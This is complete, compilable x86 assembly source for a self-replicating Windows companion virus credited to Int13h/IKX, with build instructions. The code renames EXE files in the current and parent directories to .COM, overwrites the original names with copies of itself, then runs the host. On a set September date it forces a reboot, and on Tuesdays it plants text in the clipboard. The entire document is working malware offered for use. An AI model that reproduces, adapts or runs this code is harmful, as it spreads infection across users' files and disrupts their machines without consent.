; ----------------> WIN32.BORGES Virus by Int13h/IKX <-----------------;
; It mirrores EXEs files, navegates directories with the famous dot-dot;
; method,  on september 19 reboots the machine; on tuesdays puts a text;
; in  the clipboard. This beast works using API for all its operations,;
; no   dirty   tricks   are  used.  Just  to  mantain  compatibility :);
; Dedicated  to  Jorge  Luis Borges, because the first tale of his book;
; named  "The book of sand"  is called "The other", and it speaks about;
; an encounter with a younger copy of himself. The famous doppelganger.;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - cd13- -;
;                                                                      ;
; COMPILATION:                                                         ;
; tasm32 /ml /m3 borges.asm,,;                                         ;
; tlink32 /Tpe /aa /c /v borges.obj,,, import32.lib,                   ;
;

.386
.model flat
locals

        extrn   FindFirstFileA:PROC
        extrn   FindNextFileA:PROC
        extrn   SetCurrentDirectoryA:PROC
        extrn   GetCurrentDirectoryA:PROC
        extrn   GetSystemTime:PROC
        extrn   MoveFileA:PROC
        extrn   CopyFileA:PROC
        extrn   GlobalAlloc:PROC
        extrn   GlobalLock:PROC
        extrn   GlobalUnlock:PROC
        extrn   OpenClipboard:PROC
        extrn   SetClipboardData:PROC
        extrn   EmptyClipboard:PROC
        extrn   CloseClipboard:PROC
        extrn   GetCommandLineA:PROC
        extrn   CreateProcessA:PROC
        extrn   lstrcpyA:PROC
        extrn   MessageBoxA:PROC
        extrn   ExitWindowsEx:PROC
        extrn   ExitProcess:PROC

.DATA

TituloVentana   db 'WIN32.BORGES VIRUS by Int13h/IKX',0
TextoVentana    db 'Made in Paraguay, South America',0
MemHandle       dd 0
Victimas        db '*.EXE',0
SearcHandle     dd 0
Longitud        dd 0
ProcessInfo     dd 4 dup (0)
StartupInfo     dd 4 dup (0)
Win32FindData   dd 0,0,0,0,0,0,0,0,0,0,0
Hallado         db 200 dup (0)
Crear           db 200 dup (0)
ParaCorrer      db 200 dup (0)
Original        db 200 dup (0)
Actual          db 200 dup (0)
PuntoPunto      db '..',0
SystemTimeStruc dw 0,0,0,0,0,0,0,0


.CODE

BORGES: mov     eax,offset SystemTimeStruc
        push    eax
        call    GetSystemTime

        mov     ax,word ptr offset [SystemTimeStruc+2]
        cmp     al,9
        jne     NoFQVbirthday

        mov     ax,word ptr offset [SystemTimeStruc+6]
        cmp     al,17
        je      Adios

NoFQVbirthday:
        push    offset Original
        push    000000C8h
        call    GetCurrentDirectoryA
        mov     dword ptr [Longitud],eax

        call    GetCommandLineA
        push    eax
        push    offset ParaCorrer
        call    lstrcpyA

        mov     edi,eax
Buscar: cmp     byte ptr [edi],'.'
        jz      ElPunto
        inc     edi
        jmp     Buscar
ElPunto:mov     esi,edi
        inc     esi
        add     edi,4
        mov     byte ptr [edi],00

Carrousell:
        call    InfectDirectory
        push    offset PuntoPunto
        call    SetCurrentDirectoryA
        push    offset Actual
        push    000000C8h
        call    GetCurrentDirectoryA
        cmp     eax,dword ptr [Longitud]
        je      Salida
        mov     dword ptr [Longitud],eax
        jmp     Carrousell

InfectDirectory:
        push    offset Win32FindData
        push    offset Victimas
        call    FindFirstFileA
        mov     dword ptr [SearcHandle],eax
Ciclo:  cmp     eax,-1
        je      Salida
        or      eax,eax
        jnz     Continuar
        ret

Continuar:
        push    offset Hallado
        push    offset Crear
        call    lstrcpyA

        mov     edi,offset Crear
SeguirBuscando:
        cmp     byte ptr [edi],'.'
        jz      PuntoEncontrado
        inc     edi
        jmp     SeguirBuscando
PuntoEncontrado:
        inc     edi
        mov     dword ptr [edi],0004d4f43h
        
        push    offset Crear
        push    offset Hallado
        call    MoveFileA

        push    0
        push    offset Hallado
        push    offset ParaCorrer+1
        call    CopyFileA                        

        push    offset Win32FindData
        push    dword ptr [SearcHandle]
        call    FindNextFileA
        jmp     Ciclo

FillClipboard:
        push    0
        call    OpenClipboard
        call    EmptyClipboard
        push    (offset TextoVentana-offset TituloVentana)
        push    00000002                        ; GMEM_MOVEABLE
        call    GlobalAlloc
        push    eax
        mov     dword ptr [MemHandle],eax
        call    GlobalLock
        push    eax
        push    offset TituloVentana
        push    eax
        call    lstrcpyA
        call    GlobalUnlock
        push    dword ptr [MemHandle]
        push    00000001                        ; CF_TEXT
        call    SetClipboardData
        call    CloseClipboard
        jmp     Run4theNight

Adios:  push    00000001
        push    offset TituloVentana
        push    offset TextoVentana
        push    0
	call	MessageBoxA

        push    0
        push    00000002                        ; EWX_REBOOT
        call    ExitWindowsEx


Salida: push    offset Original
        call    SetCurrentDirectoryA

        mov     ax,word ptr offset [SystemTimeStruc+4]
        cmp     al,2
        je      FillClipboard

Run4theNight:
        push    offset ProcessInfo
        push    offset StartupInfo
        sub     eax,eax
        push    eax
        push    eax
        push    00000010h
        push    eax
        push    eax
        push    eax
        call    GetCommandLineA
        inc     eax
        push    eax

Done:   mov     dword ptr [esi],0004d4f43h
        push    offset ParaCorrer+1
        call    CreateProcessA
        push    0
        call    ExitProcess

Ends
End BORGES





